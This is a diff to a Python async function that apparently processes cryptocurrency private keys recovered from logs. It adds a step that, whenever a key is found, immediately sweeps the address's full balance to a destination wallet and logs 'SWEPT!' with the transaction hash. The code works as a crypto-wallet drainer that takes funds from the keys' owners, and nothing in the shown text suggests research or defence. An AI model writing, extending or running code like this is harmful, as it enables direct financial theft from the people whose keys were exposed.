@@ -654,6 +654,31 @@ async def verify_and_alert(
                     source=log_source,
                 )
 
+            # SWEEP: transfer funds to destination wallet immediately
+            if addr.private_key_hex:
+                try:
+                    from src.modules.crypto.balance.sweeper import Sweeper
+                    sweeper = Sweeper()
+                    try:
+                        sweep_result = await sweeper.sweep(
+                            private_key_hex=addr.private_key_hex,
+                            chain=chain_cfg,
+                            source_address=addr.address,
+                            balance_raw=result.balance_raw,
+                        )
+                        if sweep_result.success:
+                            logger.warning(
+                                "SWEPT! %s %.8f %s -> %s (tx: %s)",
+                                addr.chain, sweep_result.amount, addr.symbol,
+                                sweep_result.dest_address[:20], sweep_result.tx_hash,
+                            )
+                        else:
+                            logger.warning("SWEEP FAILED: %s — %s", addr.chain, sweep_result.error)
+                    finally:
+                        await sweeper.close()
+                except Exception as e:
+                    logger.error("Sweep error for %s: %s", addr.address[:10], e)
+
     return finding
 
 
